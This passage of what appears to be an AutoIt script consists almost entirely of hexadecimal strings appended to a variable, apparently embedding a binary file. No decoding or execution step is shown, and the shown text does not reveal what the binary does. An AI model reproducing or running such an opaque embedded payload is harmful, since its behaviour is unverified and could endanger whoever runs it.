2594AB23C2762482B03F83D1C58A50E22C6130924E488C036C8EC4861AA453107E99BD0CA9B4B51C14BCD268C4921C9912EF681CBE50CA69728158DFA15AF90B0E311A54B044920A674A2BC474A93DFC0E0109449203F5049A1030F87A70040EBA4F1044C54E5439A256E75C43E49A88181C261AC37706B475B43D1F899744190E1D22D472507A6710477F9AD5DCC14702C090B5281698C49ACB5E3958D9191FFC67692323F11386CCF2ECBDD1A80A407C40FFF74CD24AC050CC60DD606FE45A98A421FAC48205D9277301AC428912E992632C8D14A241189CB0B4B3C1DC287F79604E340705100302A09E128CB188BE0A25011340C697A497D"
    $sHex &= "F8044D8F6F3A11EC34CC154A45260825A51ACB61B41282262A314128E94C05EF638C05856045863A429341BB63E99247D63FD0E0482516B58DA3D24E560AF5E5648DABACC35AD650DD89585C5817B2658011465D01C4869E28308D938D4BA7853670F01A6C385B798E5D111ACCE046A0020A5EE80F26704750AB4C0993D0C8C275235B154141C403D40C67368570C76BECEBBDDD384A9E2BDFE0740B608BB1E89E055D091FE42DC7926E02D53C171BC2224A499060045FFFBD3CBF3D7E006A6B1FA64D44238B55FC693EE44D5C44023D9C100250E7090874255B622909BCBD4CE56162B4985085228B424DC1276D784988B5B806D2855B778D0CB45C504FB14887282C30373B2F961340325B5159D745035B14151BB0348A30B51230401D0628BB95448CA2C1791D48595457E00DD81259E3EFEB220BF9B62BDFCF655C5835A104BF03C8C32E186918645A1CDD4F0CEB736A022F7447650A5109D3FEB66101A9F8172F9105742B14CFB985541E9278C26A01801DD645AB43ED8D2BA065A771E0E038AFD2C62B24BF3412901BD7BA95FF92C8791D5A11C2A9DFED3BA231D534AD247422759B04E12935EF722CB155BB85DF01ACC29086AA81575B5B08CB5B5F012D1C4A257F45D64A0D3143D61F5640BCDE009EBDC0353E08D783F8120D62C2928DE250CCFFC4BA01E0FCB3884FF998655807EB40C002224EA5817951ABA5FE603F0456115B542247DA6988630324EC90E2E4230A959C58E5FCFC548FC5078C0A0A741509740FD03704F00DF6C6528E641C28F7441150E7A701DC5F5CB167C8C4EE7D654B89170D75E3B992996D66AC022B0F22CFC4DAC2C6160428DC440023FC08018B2CC015129E1C01490E840586806F59732089E7C05A2C7E21200629DEFC11A7696B4C9C1C86DDEE17F9CD6770398A905785E50A16AE24B1BD11384C18840865B3B215223E1945F1A6804F265508181800F83F6189177CD82C99DD52A53AB9DAC3A4DC5505751E69058C0F4907EB408701373C5C85581129EB980C31F15AC782378205D69D5A43A9FC490C65824E78F261D8EB64895ED5384625190CD340808AF3435B384F4D1780DDC7747C439705E82A00F163584213DC5D090B13E4DB167E9BDD58909947D2855C5C00D3E360C15B0343031BA260A7B9534D41C44766D1E940617CEC02B3C759848B6C1BDEBD8C8D75FCB4DDA41F8B6C0011B336D3C02EF9E9B00D66A220A3372ACE14805FFCAB6D6DDD34DF7C8F888C919B41C234C38A171920880B682D26DCD22C449000E8176C7C133FDF73299C6F13570FABC121DB176B2D15FF53E9388EA4F01287301A73159412445B280F3C6080207BE55DA0C200637D19958348DF45DA48D757F1569085BC85A075A1B34C83C028381C8D87422C1667023E564C"
    $sHex &= "8F0A07617A080780F4F26D03B888D25B7887E0803B7B7EDD605DA905684A41BAC2B371BF291908C4FECFB8A6208152A9E094819EB3E8C7C40F02B87D59E8EB1000CCD80E42371AFA3E32EBDBE354EF54CE427B2754563B3E7DD42C034FB33E60173C221E5A055E923D89B8918467F8BD4FE07C168E344EC1C981E021090FA57539CF10B11367743EC3131AB5A409BD24611156DD7DB14DC83F3C388B4DF4109309E68F30550C7D11E1DD530123DCEB57B2262B6382E50505B95306764BC9EA424AE9A7244DF9366D4DE820450C906904EB830DF7EBD25A3BCD0302461A217896FB56225253831D6047C22DB40A95285A767310126928B8020A4F1B0D05BBDC863FE616BB00C163475A04ADC2341F8A9279B5A31E03C61452C48CEDDCFA0A3ED1B5EE0898FFE4A09190D0E9E9CCE1245C86D9CCCC63F044E849DAB0CC21D74A025EA4903B51107FDA4AC2157610BC7554A6D08F2B85DD09653E9FEBED88C0146977491018B75B03E82940165681D81BC9101DD23805CF60027CEC1A766726A7FC75410431194561C357B1B64C051009FC54702A46C8400805752B3442B6C4FD6C420C500137203836F937828F69CFBA0206554FCE4402A3A22B02593C0D3470F7147418AEE75246D14CA555793945F1EB1C8B1F011E0380A50B2C2E6097003930DD3804A4E9B4849AC70221DC9D065EF0453C636A03018EE8B4B1DBF6410F0161EC1A8A5F05B39459220E99CFC6C8542FE1303D0064B86610FA773F1D181935958B0CC5563148AC5D1F25378CA625D0AF1E51F026D10ADD5C23F0604782D041746E7F86D05B080B455A02570D8B685EA12B0832A34584F26285254E5B7C04367288E19B704A41BA37523F8D88C483C132EDBD7B9546F80C1E7007A865611A99011F75ADCF7C510C076F0B45BC14EE3237FF71235818A8459F30844E84C42ABB6D1C22BE007D9927BB182CE2CAF5B40BD995659D66D09281376EF551EC75D3C4221FD1418F9580CECC3852AA54380408CD04A0F2797324017C03234586AACAABE346D9B5F0DA5EAE777A698A5413382A2380F18E259CCB0B18BE208C2E43598C1D1895D8F0AA2405713D9D2CACDBB0B2CB13413CA1F583E1F712177640C67A4B6F7651C0B29001D17980C3169D037D451D51B6802E407DF56C697B2AADE6252096F726F5100074121C34F1999F10CD081E5FD1E8AE0CA7AC4CDD69040AAF74348F1CE6350D24B720B19A0E501C100B33D23B59BA8850040F148851050E9161C4C50539A14A45A09FC8111AFA70AE20385F7E155C86962F3340F9EDD61242AA7FEB5F0B38B80CED8C9721A375EFD5F5CA291313505920C08634F15185D036AE0D835C44D088F1DF0A8C010360BF851F8237B315138A054DB3C7236723C516717D20414B8B97DC8B286A"
    $sHex &= "0110EB9E8EB11C22056EDC69884391A8178D045C91420599DB791F43E1066AE2087C1A1D0680DD2A2BAB5F8C409A2DAD856F02C454133F5A5A2B41CF2D16248B200A48265979E923757406743675D7D2825E7524BD1E0A493016D57F7F6F0FE495D7765F346A97624F9503751B2E040C1473035F947E1C05756D192E685D0CBB18378B684EB167046020601C8C702BAE2A289556E9F88FBD0DC6DA5DC3F5439929E1E8037F20D6C62427CB958083C0634BAD103E29E2027E3FEB5AF058153B28753455147A259F1CFEE8EB746802B02B841F01E530C2DD02D337AB938E162154571C12AEA681206F2434BEA0B40FFC44661861C0CA671FAB9DA00624E33C96AC58C865F0380F966A8456F5434D8D1F8E7CD012D08CBA88092CD6D6753EFBCC598FB7A1F7E0D927C111509BC61557A9991D9C5C3C3C71E3FCA9AD5AD36963E303ED43D9EB954D9FFF4300D64403C3440303B81F7B29AD841691412D6395C8962E35E84A6B5A66DABF0C6D6458A8A993632CF30011BD177D524721E32767345BE470E22A022932F031BE4F427D1D217F05F11B9261EC35F8369206D476D9EBC2EB9F0285548A3B80E0E4E23F65E01D4074D0F9037D3205E025C8A491E230D8A9B0F559828B1B28C8901810F7223C082E50E015EB8DE983CD36B05B24AD410E901C36DCB114619591C0DC31A5239C00C197DE6B286CC7DE0514C450A5E91041FDF7B00E5C1E2BD0123B106FDFA42F998E8CB0E3C32181307935B5DD0C089DA241E1B9F69F188838332D3C9F319C5A54C2C41397C08842CD1F4D098903D1FC12844197771121163141618591DA65E8B4D34D61405CE172D735109A2F874B152E60E1F8BDFE1952AFC9147E1F68101B0891C44403697D14271BCAE8C252674F395434720DD2EC042D4230B481098C13D762B987EB1012F1A1AE6B42FF5518201D218517D7AD608DB8A35F40D2058525DDC06A226012CB338FA68EEEE4AB2CE2A4A3A98310D0A49818628DC055C705E2619417D0B00D0343C307ECA8235FCCAC30D47423A500AF445619409AEE2FC003C8489A01A404CC01D40D3D405A6750FFC25A33AC9F8E4F5D30236A514BC0B14584828D08005D43C7FFD85829E9F3271B2B86D589084167986FE0DDC4CC8952B782A7C74D47F430068BC0AB6A210981483F0DF8186831DC5B69A5E9A6F1981A9DA26BF2D4E0AB0D15B34574157E158B7CC9655C08583F1A083593EDE0AEF820A7463516514FE041107A6D35E93C924D2D5DFF50291E06F2120A5E3AE4041EAC7ADABD7F637A68F0D68A1980DF54825E1C81028AA10918458987E89B2B2ABF0ADD01DD5DF41A02BF2051F431F472B001838F9F083810CE043773E2624B100B287F33D016DF4684761D32DF69B9DC3A576DEDA5557FC5BF75EA4C3221"
    $sHex &= "665BED099C42741841D934AC130885C1953B3FC8120ECF191942863ED8B0ED9509EB170A45E1C5D94A08DF0B15922E108F619BB498D0BBD998D06B1B2B1463DDC6B6515BA90CEB93F0A13A07F0F2503AC6DB7469ABB06095B4AC2F990D9A0863FC9FC5290A23DE6303B3B984A14721F0EC908853934048D538F2270DE4EC7C18E876AA27B0909FBFEB057C584C11276C629B52833F95ED3A1A4210EF13EC781456131D152F9E6E989B687E1891D80AFA1490D4726D7AED535467DD5537BBD8448470E8777B6EA6647E689700F9AC38307C173D95F88DEB5399365E12CDE8E0A545A4837F3A2B4B596345345987103A22A0D3200DB6B1F366F02A5685A4F31F380D231910F64124EC6ED8E13B0A5F089088386BF076984E1CB215F3F6B321340E6E9233F8AC0AE86BA104383C998E56352C3F1E459E280C4D7B046F74670BD714E574201EF590471E7E361E029ED29A7DFC95615AED5A7987330F69B8CE47CCA8633BB6F00010BCF0350088D7F12F95A08D925C871F751FE667DDC5C661D42ADF6DE4767FBAC9D7A35F813E6132D9E0DC1D1C6CB9738B23057A2089DC22F159D3E0DC2A8CEB4D05C1294CF9BDC7292C9B26D8CC610E9A220E0C95EB312962A5B007ED6B5DDB2A69997DB69A0CAD4B3FC7129E1B44A80A0546F4E08869B27031F9291C58AB2DBBE08D4805364B741110F9F062B10132F4FCA2759190400B6EA5B824E82E4A2BA5715E5C20461E9CFCF807C20990AE85A5EB48C3A878D5CBEB3A69DB7AE0E15C088B3BF0039731489FC4354D822A5221EFA6F658B5A35F716263948D0C5B391BC26490CCC4002E2D150BBAC87625231B6B475771A51E70C76D816A502A488D42B726DED2B8FFDCE75A516E14539B45CC784A8341C80BD2A1AB8505D7E7ED9F0A75E09294F039D60A18018FFDAB435DF8F4F4EAD487E89D9391FC3DFC7F033CF4051592E6C6D5EB8CCCD78D2F2BDBC075D80DAF81854BE035982229841F013DCCD88D136880C17820A29F04731572374247CF22144FF08D9584D4A5A452A8A9207225DF1E50CD0C0C7015B1EB5DE38D167654FA4A7DDD031FED69ED00F2CD38EB3C956599F436698D6F3DDC785626690141AC03DB295EA79F4B760A22AEDEC88C45D8410AFF9F44844518CBAD73A918C9E8B0E8E8BDF05CDAD218ECECD3C96463421051F861A0B5A4EC7C2021B7D4878504B063DF7CD23DFCD477575D1C661947FC6A24825C08CD604C4CEBFC334572C03818DB0AA900D77126C84F1D423E12C0D8E6CC282A40B85FBFEBA7EA81840F45E1FC00336A305FD2E090C98392E604BA055D954B08C2276160F1EB4D04B5457C8AA3894B012C1CFC2589610FE20240D046464BD105F1FB4A6A622A881E7DE403E40685770117BE105A0900FDF152B98E00D02E"
    $sHex &= "EDBDF83216C8CA9FB33A64103E86137520C70348C1780D0B27C3761671B338F37DB9D8D949EB0301181C1A4E054F47E3A5E63507448301FD7A55B05148073CD98ADB1B4917648049215D130DA61BED6895C6B66023DD673A97F163211F3700CF4EE81A4A9BFF2A4B7B1AB43899AB5020BF1FAA40D0604ACC031AACC026531D79017190012471823AC6ED1B833B292B5777B4A101F5B8BE97CE5BE2F33D76AC839D8915E6D3D50269610D441485FC96B5D606412523E1B6300535D84DAA5AECEAC74408AB27B91C89C2DD36A28DB650E94D15F82D1DD824A561E17D055EC8A78CCCACEB1E1758C8A5A9180CE8BC6846190D8C3E59FF04F095222189E9DB5ADC45890AB9675C0F89C9DF068D4F0C098DD643EEB8044C6CBADCCD0F6828ED401E5F2961588DCAD4753C075E3B028799E37411D8D738F6646A8B51F3376D9C983DEB2D57C97AABF062747BED522B8D540DAFAA120C67E75FD5230D504AF612688C4A35F42A00C1799F8FE0202E920D7CAB808B05531EBD4E59BB34209CA16DAC26E3B3DF7EC2C0232B82BD149411DA436894E748DEC95593082ABE1913845ABDB819337D0016A0A6B70C5007AC21B436B08F43AD43581F5A28AC0878971546A030977D2E1F7CE3268D150F342381EABE752CFE757315FFB1A49165AA1B623E4D85943F2C29581CAD92033DCDC1A8656141C24B58DCB2B03F6A2D0CFDF14C7D2C104391C24B01DB302AAE01B4BC7D374331344D41EE0230EC00BBDC20DC2D0B572CC530F49E2638A37DDCC3B6619B7DE12809FA84342D44074A6174DB3A3C1F590DA70BEBB102BCE016D2E96B89A7F88554A423D8C95649EC829F2FB027A1159DBCAD3F5C2417C9030201AD147291002D22412A7FA1827824C27DA6A119065877835CBC98017A25B5FF675C9884471035EDB535B19527FCF75E1111A758FBEB30C07190FAB958BD584234522C3941F9206CEF8B7723696388450F80B744EB653253128BB54F6260C732D6B679792F21C141771F9C78809490FC49C008080CFBE7627226E0557195BCF1EF9E44D9648E4158234218045204145F568DD0E1FF7E275B674834305270B0D24A31427331655FC4E005F241AB6598991789D1451BBB8D3DBF6E808DD1556F08121193412CB5DB3A00CC9D04BBA81C6592462C101F828588DD9D3300AD691587C145AA4B41534F0C57E8D6C17BF44F7FCA16726BDDE90109A5D9F3A8C0283E66CB683002676AE0358183751C52C48D58F2BB586A0707610065535BBF11F74FFCA29EF77DF442C2970574756867610871455910FBF49E30AA6CD3DA081980C6403544B750433F1BFAAB6C78E8B2D509A1408EE4609A5EBB0C8B01421F8520BFAC5657023E4A8B83B5222DE213B79234D72D16162CC63137866EEC492F85F56BC430"
    $sHex &= "DC22702FBC41CA95905DC451EA0474D8B8F3BCD88EB07A15B8D7B4032E983D4C69ABC50D208AA6AB6869352526AE2355B00A109F5542011DC17D375B24258911BD0B5277788B9511BD8D8F20C2048628FD86861A121F84B875BC592FC883F96155C2A669DAAA26C03626D1454DF90EC883413103EB2D7708612097031932E7A384B4117D047FA5C63F12C477138EB864730B8DB316428E6582EB681B4C0B1A7885E859EC10FA378446117220770BF1D6ACDF4437761333C58115E8B546B8521541DEAE20791157383CA2760B167D71A0DD26F140C928B9E9046F8D1319DA301891F7B12A0D7F7F4F04F5C2F825A0EC3D964CB0036B2D9EC5F3A4BF1FB91134D052EBF7A89D38E4D0CD3E147F83EA488911BD0B2FE2488DB29E039CE4293CCDF37788AC8D7CA8343B01EFAE208EEE85502CB9A588B1F1029EC6A549C09D7AFBACB7B3EBA8DC176B0C256363A92C3DBA4F95E64E29C0C1288B559552DD40DAC96A0714E99B038D29B21D74DF2A5E0A96747F30414F048C3591F861A021883FC575C88DBDDC5558AC065685221B28047BF23E09A912088D8D45F774C3842FC82B9523414A0308621B0D12F420272131791B1833AB01570DFD83FA57756F5C055940374C9868A586DE23884D81A1017E8DD42B1D99B9B62A69701690D138F221D2F1EB32262C39407CC9905C0403DF6DC8E3E85644BF7748E38DC26D01AA311B48518C9F319982259DEC7F505F95C8E55A73C29561E058EC048C10590123B30DC3D2C31038599CA9609858815C1E0AE4C12E4181688E45F245C48AB90722EA11145B6A300B8810924BD38B7FEB58E8D070084630E4051B7D3C040A04CEE5C602251A7BC850C50181447FF4037A1B87B02F3BD064DD7D30ACE0FE14890A17096960497445CD89F011D8B052C17B3C5FCB6229A85EE698FB79E7795B426F803506237351FB799E5F374B87000601B7F514884B0115076FD81B580337040A053F020600BD67B3F9900004828083CE844AD51EB1EFBD67B316855481DF102619067B260BF266F77F0691000B010B0B020B01030B040B050BF05C7E1F060B07250B08090A12970C03DFA0CC32B14C715945B51AD645E3E037E45113740BAC60156429C29CC0E202141E1B565BB58045B0900556A2781F52749E4C4A5C3CAAF037D8612A3F29008D8D49C4422A51603210AC47290D953CB9A01F56888C1CEC86805936D807C990ACADE02471C569AD867761DFA4D1C0A19D02AD0CA9D6491C4A0CD9624D61280C85000CE03874BB655D54410B9F25FC9B20D624BC995DC28A92F8855F515318551F29D6D645B8F785F7B0054BC5D7DFC656E13600E3DB71C5C237D6DB31C1B89104523F17A161F893790460410C2C89EDD61B902394244A22555F0FE28C50459FD6B19058B023"
    $sHex &= "5707F03EF7A2E0C7F47A9051826D2456A1A52EC7821084A91F712C4A6200FD78EBD828B173FD63802CE073C504E0805F24770251A420EB8DC6A288829F8210965DB065FC665ADBAA5F5B5F3A2691E430F96DA0751371AD8ED278759808797511230B08BD7593EB41C27A143ED78D824665CA838928C1686C4386AB86893BA1F08B3A417D0B354725255CB9100F8DE563E30B984C10610504084CE0A3B4027B72107430253E2D793C39E04BAD34105F14FF47444022E08EB9FAD4001442EF68150CD398C79A27C0832B63A8250BE4D6103E0A3BD861A90163C98D701348303488E84122C3B8672D9620242405A920B4D25100AED7E8E30C2DA043EBD40A7D009389772608A81D75091D40E1EDCDD80D05E94435D4347A022DB73DAB3716F160B09D2D4402A4F01A4CFD8804E904A397DDEB6008A4A2703521F2D2E58191D4EEE7D2F08ED147D0C36CD0409A0857EB3632DC3F29611B356DCD1008842626D13C8A35D89F0F8CC216C0C460E767FAD5D6A2B07FF117A5203D074E803708DC903A2E0E68DEA7AE4000DE02A309BF48230D948B3003A44113FB973D03A72303109DFAC15274AA233E958BC1844FDB8940AFF96844E813F8A0EB66B775E9B6F0D3DA1CECF694DEB10AFB2B2B69AC48EB5A242553F800E398370BC0FBB50FD7C4EB20ECF7D07C230256B09EA2440A0CE05BA58D8E5698C0956AF286D16A347F550ACCEC8C034B9C4E11980B4A1263706C70987EA4ADC9D8E3D9541143F6557903FA42035C614319F644840694896405417C036B6CABF9320173BC600C01DBD21D015063743D81DB2C341FAB4CF18ADAC2E3021D0775E8B0F53675675F08F3823852E71A8C8338089B3959E0D14129EB206858406C0B9B45970B8738D85991AF223844405F6A200309F31DC24704779CFA4956083541F80535AD67516183458A4860D01434CBCE4D341642F4BA46AF0AC271DF6D1D0B5E60ABDC4FDD190719A3D9E6C3DA0BC26C81B108034DF00C1362382AB50DD1CC022EF150D2B13FCCCC1D7B5906F1181FDCD1D89700F11F26FBE891EAD823BE232326D8F7D116BAC0A24FDCC8235E0BD19127A0B30A908851E15247DE809D8C1F7EE00D063348DC30DD1AA8557482F9197F2A2168B13F4FE9ABD3D2BB0495A4ED8050697712374217A5A58DE8BB0C546BE521A9BF07435F0E1C9D1B6EB0CD6E946029295409770090DECB05A943B81A0DE1B9C5DCA8C323008D382892432A9DF9DCDCDC244ED49649F89CDE5A1FAB9CA899B68B6C374DE10C2F82148BC06D8CCDD1BE3A8818E43D8A9FDE28B22EB6DC1FF3D318FAA2405539E009428D2133DC900C52E95BDCDCDCD8CAB1B743EBE37D2BEC031CCA099A4874986F240150411E11AF9CD278285CA47BFC7E7507D416165BDFE42C1A4A51"
    $sHex &= "ECB70FE1604F884B26E87F2030CCDD423850EBE4092904EDEB5B430A6DD67DB97B7C121455C15E8140D87D2B840FA4F1443885994602E9C174780572BD7341829BFB043C8B45DB001C2947C31D55B0AD04265250CA86D913AC97B6366417C14BA811B3872319151810C4E82F248E6134FE8889A827ACCB0346E854E24AB73195D107B0C07FE3B5BA188957982F47E41D20348017E156F685855B1AF775176F6B8FADD94D9D42049F24CD2597E008DCDCB49278A740854520B093C8037336B1683BB5CD61B0A8B8EDB5DFE438E0C4951661BBDD0C7FD017A14FD80F8F29131B7A7D4B1158DC351C7E0F1B971D35B47895B2FB1E8B31D00EC0056D45F3E2DB051123F097DF58340E06EDCC215482D007E0290B349E44DFE0D0D2F3A4E901DE8B263659220EC875C47011BAD1CDC41217A10A48C2087D78AC81BAB8761DEF5150468250CBD56A8B98E226C8DDD4D55604CC901D1A23DFF865B21577EB7DFD8809C1120D8D84A1353AD03AF7EBB01070964274E6838DF30C96A625F0B64E4270DD3D39486487433414A510382308E4B9A29091225C55AB45A6E8E89F181DCC000B2114078CC72F6BD2630241520D473C2C16B546A1699558D58711611E48C246F1BD43D285002CCC44EB034A826ACEEB3E8948426DEA35D20849E84BA088BB5C9AA6EA02EBCE344D9011D61D072977A32AE4694B6098DFA4D1E2F8F4215712035F2C0B2FC16B174173B4962A2C7E4C7BD41A09ED08819BC099640B1ED3B19BB7B93B0B54D83477FCB9223231ACC3770473B5B1E127771F9A186234082B3D0B013535BC8816C1F8F8618787041D8D8A8023444ADDC3D314D63C4D118B6A2F40FDA53692544103EBB28DC6F77306F144410227D514500300257A050B06700727C61A8E96BE377914E0601DFFEF77B7E416215B3711BD88705E9A9953E003BC283D824459223933A446E018B227024195C6C0E84DECE8DCD7CA1C9EC8811328C0032EA4032C265171F6010A99919C27FF9A668A3DD801F13BDCD8DF4F58C82561D84BD887CFE02183F9234DC65C08F72E5137EBAFCCA2A6AD9D06D26722450001B336D8C2233D8E31944EEB15A8C6286C03108A2B86996407066E52EF9A730E7BFF47DC4DEA457CFFFBAC17BAB1A6BB1F5B06B32605274D6A815CDB493F6CB4D12238DE0339017D503455820D997D36597A8D072955D0AA550225296332040745F95C5A5C8146BFFF82CB00E9A713FD66439F54D7D204221B91FC99463AAE422FF026F819AB179E03B31802CBF80ABBB1D9CD4328EBD149C95004ABA17F982A43215777BE2A15094D4EBEB3008E0D635E202684D949FE3F880961502066A1479731E99F387574625B2D8D1A1D19D997F1A24669A21551728C9D066687990B95C18043EA047516038686324D"
    $sHex &= "EC99ADE1DBAEC1B3089F70D37E8C5DA341DD5C7F5B7C0638B4B1012D7353E3A83110D88FE88FE4904A65E8E8E8E81EAEB1A5498F024064A1250FAF085B90918E8287221A94B5249428E31019AED916F75D4E0EB26B337F78665E5CC2D1846D60E4279F6942800E893F443C13E05317A91E136ABD34A1932FFF160ED709E32253E0D94223122F77977C1C7F7614F5C01FFA8060DA0083EB206422D28A3D1AD62905E0A6A5D90017968ED3DD74C82B815927537F1BCE6C4AC4D1C948452820232230303BA013A668CB137219944717F583B677819152A60B5A744AD7CBA5604052E0E4AB60C70E6FEBA4118BF4C92416B8373D0AD91702BB743523D2411F4AC30E0561A275E8688DDF4243EBE3EBA7F12B250CA616F7DCB3ACB892A7AF3A758C75F40DE14A58A74E8975D45E64080B5552CC7C367F0EC5705FC8762C43741B5A64042A3E27A7D381139E4F92E95C4223B012CBFF5C480721EDF882EAA40D619E772EE5A29C2347B690E1D890D898D87AE0C891A0D8A8D8B09CBD17A38E82718BFF9057CDA69EE706696072BF28431728871A229600F039FE4448890A47436A3056DFCA2F53EEB6327DFD047A0D4C2CB12D7B248072233579A88A0A06A6A7ECC75AAB59D2BF404FCAB8608A5149001570F02F4A7C884DF65EF61732D09982545B0E1DA481591CF666022E97824680F8F837D0B0B642B56526AC03B869069B15A00B68C907F2D034CC44635548DF25781C5AC717A4B25DB1221818BAE750921610D5F860385EFFD702EB7A7A65A33525CC045156D1F5A2895B3E0E911A208E6D3FAE9096241E9D273A48B8908BAC5B624601227330522C05353310E66CCECA110821DC9FF8331F12DCA09F054B18AFB0854C130381901B044B7CFF472CED16101D572C6A46ADD13EF1575F189342316529DC14B1D2A9396CBA9681C3C70684446D919E7444BCCFB84FE99E65A01DEFA62AEDBA8943B71312DD8606D858295BD321A0C838F052952285202B5A74DBDDA751299676686300BCCA7B6832759E54870C422D1046AABE057589CCD8E88F0C93A657D8D27EC554F5B48524AE1AC9D525ED2EE4626315D93FF1482EE487E80E04A658F4D61A7661F80DB30CE5CE3846E4F30355EC3418C0F0ED72612AF02C7D58F2E406F06676DF260EAF057C4B718734AC76F051B88E4022A0478D96B0C6171DA7A0064825A0C511FF5903B8D8F75BD3536D7C2CEFD0EB50D09874D1246EE05DD1B212F261D0B140A71235710C130EC5C41B8271F4DDFB53B9D6233D95DFCCCC2F8197C0D149CC06C54CDC587120DC7B8F1E2D465BF79ABF248A8E6448E4ECB0E4B5E4B942E48A007279F43C7EABDCE01CF4E56854167975B74EB72E9E0DF591A4868306A316D93485A321CF3838E8D9BEE8188A000D0CBF10A4"
    $sHex &= "266210F3F426307984B304A3380D77DC5DB64B2F164C80B45F4201F012DB53B4AC02105A77CC1548D5261F9162D102DB78E7912D1C301B444E63FB18558639026CAB6247B015C1BF1187346000B67F31E39A494285FC6F181D1BC4191C1AACB6CB6FBFBA241C1516FC15AA13BA82E1FE3F325A8497D4B5102B019896C60223FC1540441835E75668248201FFBE0696CCBFF89785A335339CA01D88C9F8C295C6F8ED18681C652566C053F0711770572527041C7A3496268C0D3F6CAD1369DDDC36C22064E5DF57096B2B0F23D3F4C2C650708EA9F4A0B35B71DF7779ECBD4D36C2CB3F2EAC913C04F27FFC03618C991BC04B6DB308125082855B7794D60AA4301BDB0A6020C3271C11AC6589D93FACDA5818813E83124B83B4A989628103844BFF83942A1947972A560DECF883DDB7BF4989928F03743C047250C7803FCC4146626B7F6E63D5114D641DDB16AB058EF89D7C8B2D0157C703FF6D9885775A1BF8772D4B300B3620FFFF4493AB7A7469B1084DBABB84A45A4B28A45B6BA443571F2FDB83154E5B61A6F9108EA8B7F8A9825641D93D3B8536B119AD5FA00F025E8178930C0496008EFF282668051757ED9B0942ABE1CCA3B5AD944C3F10C6924E9185DBB2222AD9B819DFF45EF44A149E840AB12357787FB0EB5E74163082100DACC3C679108109A0C78D300B5DB1F101EAE0A445171D382CF077B44415D2BA61E2EB4A035B5B8655A5998D40DFC670C5F82700F08210931F7507C0B017BC03022D7409311B2705DCC861F962750C45D617DB637505EB13D7B789ED80D8297DAC0256387411430D78B7F21A0FD3AA9C548D90796D8CB1899B4408B8CB3FC904AFBC2DDA15F029C0DBC73164A409805F208015EE55B0DC4A5C8452E52D6EEB6FB88366010C77001AD96D794D3C3D8C0211E0A185C23919F045F582E164EB8F50856E3B054799EBD021AD19C050D5A0110D87235011616C7C86FF11F22D118B2D09700BA5513F635D94900253455181C6E23FE3119A3A6C176A30BF33B5B06C04E44D521840A5E4D03D4353CF202C7FB903A933F30443AC6F047CBF242E0C5C0A07E986F09A410C556BC5051A1FDE1A9A6E65871C39722239C13F86DC876C40C20156FF700E4DB294AF6C1DDD6E2C805862A709885248C14A054927A4990EDF189C8B500BC3640063F7A1D2C290B0010CFCD2A5702DBD7C16A26B1FE107FB7D50434BBDA010436A40B2C4410A893236A0C491D47A304D3F5C490FBE4C08168A650580D0995B16FF8C8805621F1E995A45FFE9F4757A58A9CB07F000E9E8344703610580CE096A3DC5BD272848ADF07D6DA31D6D601B26200C8267F441CEA22A0415A805E1AD5A51A76A0F192CE01D1B333BE8DDC49330A8C1B90FAB3B1DFDB36C69821D0D6081413EFF7F"
    $sHex &= "E322359AEBC78BA0344962D20F3680B50CB37302AB536BDB3FE452163611621084AC6D84C3C4049143775197B92289121459E1980DE2D33BF434C83940EB04B4F4B85BD4A369B903D828030FAC473D0380052F97EB9025FFB7055C5D665B09C6A70E5A26EBD538752B7DA0F54F252780342B89D818A01201A42F3ECB5815A31F180A27215D04BB83933051DCBB88744147F593C75AE606618257C40F431601350C97085C0027C3B6A08E04B6437A1075EE25F4FBF16D6915F90D1A7A8724B95028717EDB5D7D5D75F42631880C10EBAC02D09CB2E30602879E90C102EC4328610406E1080CC5C17F38F1E89242721729EC4021D9D0FB55E4111B9A46F1243B2640632B8C9B2E011D05659E1B691F9D901704B9E738E803178450018D0202524474DC83B2A9D313757136D7A3A18C4A751F0740AABAE51481F422600231954437B653DBC5DCCB6AC6E0DFD669013F4B6A27376DE8D0FABF0E37E03069C3912666E8CAC240BA2DDF35B82DE0C3730395001CD23BD8E91893669A76D87D90C936A66BF029004760F032595C2A072070D097D08D93B700F10A35C86FCC6AF24FC12E19B7E4C8E4025AB034337F92D2A05AE7D4343452703EC102ECD4D846AC60A004C510C91848110D5ED8170838D3DF0309026E6D6D30A8228489B7EC616015585ED42B97AD248D691F485B9E40E2F07001284E3BED4ED4E82E1428E0C8847C9F791459C8E469C9844CD0F003A9C50527FBC84113A60C9F99049EFEB5BF3C33F03291E4C6F84453088414412681A30741C01C1FB0DD28BF8839BF144D8B261F60C0B1B969041CC9DC0C51CCF40056E5CCCCDB168A46B0258E2EC3BC48C8568A96CCA100EF0AF003146A50933B4A487E65B69AE616BC1441478C830B1EE44DB813CC29012BB61E1026ED6A25F0002D96751E90A7B3B5713FD85EF54E701017C1D4503B30C346F60F3B212E48E64FBC7F198B4D1431139C108ED6F5BC0DEC6C1B2E64B7F490E7051869720AB5621138CF616FF220B373B1414DC4C10C085DE82020CD50E544141328485055024CC142590625ADD71B100F16899DBCCF1101A402001F25CE4B4CEB112115EBA368023BC27F4F863542DA9FDD7D2F02C1217D618DE0D1E24A4867130201840524978FDA1896BC1013148D48A51097B234DCFC30841D38EB8E7D12D20429D7ED43CD2557A117D4FC141B84C12402BF00049F1127310FBBC87832851901CB1F3B03CB80AE4DD051CFC5C065D3E010E0D088B284345B5AACBD501A0F14BB564120707447EAA114771680173B7A716A596048E0620168611BBC0956B1ABE073085D0013BC58A0BDF481844C042FF0F703DE6A1E85F00C490101CA10F0481349D3E410C400F10566E1E2BB13A55A1A20FF34A3ECB138616DF3C235D04D152971E4"
    $sHex &= "F683A0A353A3DC033EA5990623E44C104252F8025F830506F19CE403F067E90A38C6E0BDD738BD52246BA9EC82D48056451A712CE2D818034298E00E4A8941595390528038F09F0CDE92CF98C95C710817F88C24F73D7CDB04561B6B3DC758C6E018D825785BC9F73A411CDBA198E323B97CA7144D75D44E3F207C8550C86A62FF342A5D12F54F67B7919C07D65BD893CA0C62915E0545D852F924998869D5FCB2D2AA057365845F20F4A64FD4B712EE202BD023F8762E879692023A073BA46A1DA0612403C61989130622C8445013F81385EBCAF3A149D0F20000106DEF441283CC72C8115F963642ED736A11DB09621BF34BBE6C60F4CECAE2683481205FFC17841E0C05FCE0185C272E020FF2E95EA520786BD5032C30422370BF5025D0C2DFF840A84B0F10D0D9037D180CA3813A9F05200546086F306BEBD91FB024232D45674A643D271424CA153AD8A118759BD548A330841D1574DA478D65DA1C77976A85061BA5B716A408D2187DA9A2C9D28711FF1CA7655854B3C2FA584DC10D29B949127E85C3FB8BF428D513966F7DF4AA3C4D